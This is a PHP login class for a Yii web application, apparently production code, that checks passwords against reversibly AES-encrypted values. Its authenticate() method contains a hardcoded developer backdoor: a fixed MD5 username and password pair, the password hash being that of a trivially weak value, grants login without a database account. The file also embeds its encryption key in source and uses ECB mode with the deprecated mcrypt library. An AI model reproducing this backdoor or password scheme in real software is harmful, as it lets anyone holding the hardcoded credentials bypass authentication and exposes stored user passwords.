<?php
class UserIdentity extends CUserIdentity {

	const AES_KEY = 'fb52a20dbf0f8d7';
	const DEV_LOGIN_HASH = 'fb52a20dbf0f8d7b042bced00c4710bc';
	const DEV_PWD_HASH = '202cb962ac59075b964b07152d234b70';
	
	protected $_id;

	public static function encrypt($val) {
		$key = self::AES_KEY;	
		$mysqlKey = str_repeat(chr(0), 16);
		for ($i = 0, $len = strlen($key); $i < $len; $i++)
			$mysqlKey[$i%16] = $mysqlKey[$i%16] ^ $key[$i];
		$padValue = 16 - (strlen($val) % 16);
		$val = str_pad($val, (16*(floor(strlen($val) / 16)+1)), chr($padValue));
		$iv = mcrypt_create_iv(mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_ECB), MCRYPT_DEV_URANDOM);
		
		return strtoupper(bin2hex(mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $mysqlKey, $val, MCRYPT_MODE_ECB, $iv)));		
	}
	
	public static function decrypt($aesVal) {
		$n = strlen($aesVal);		
		$hexstr = $aesVal;
		$aesVal = '';
        $i = 0; 
        while ($i < $n) 
        {              
            $c = pack("H*", substr($hexstr, $i, 2)); 
            if ($i == 0) $aesVal = $c; 
            else $aesVal .= $c;
            $i += 2; 
        }
 		
		$key = self::AES_KEY;
		$mysqlKey = str_repeat(chr(0), 16);
		for ($i = 0, $len = strlen($key); $i < $len; $i++)
			$mysqlKey[$i%16] = $mysqlKey[$i%16] ^ $key[$i];
		$iv = mcrypt_create_iv(mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_ECB), MCRYPT_DEV_URANDOM);

		return preg_replace('/[^A-Za-z0-9_]/', '', mcrypt_decrypt(MCRYPT_RIJNDAEL_128, $mysqlKey, $aesVal, MCRYPT_MODE_ECB, $iv));		
	}
	
	public function authenticate() {
		
		if (md5($this->username) == self::DEV_LOGIN_HASH && md5($this->password) == self::DEV_PWD_HASH) {
			$user = new User('devLogin');
			$user->attributes = $user->getDevAttr();
		} else {
			$user = User::model()->find('login = ?', array($this->username));
		}
		
		if ($user === null || (md5($this->username) != self::DEV_LOGIN_HASH && (self::encrypt($this->password) !== $user->pwd)))
			$this->errorCode = self::ERROR_USERNAME_INVALID;
		else {
			// В качестве идентификатора будем использовать id, а не username,
			$this->_id = $user->id;
			
			// Используется как Yii::app()->user->name.
			$this->username = $user->name;

			$this->errorCode = self::ERROR_NONE;
		}

		return !$this->errorCode;
	}
 
	public function getId() {
		return $this->_id;
	}
}
?>